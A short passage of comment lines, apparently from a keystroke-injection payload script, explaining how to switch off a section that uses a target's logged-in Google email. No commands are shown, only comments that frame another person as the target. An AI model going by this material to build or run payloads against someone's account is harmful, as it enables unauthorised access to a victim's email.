REM is logged into their email. If you know the target may not be logged into their email on google, use the method below this one. :)

REM if you do not want to use this method. either delete from "REM "START USE TARGET EMAIL"" to "REM "END USE TARGET EMAIL", or put "REM" in front of each command.
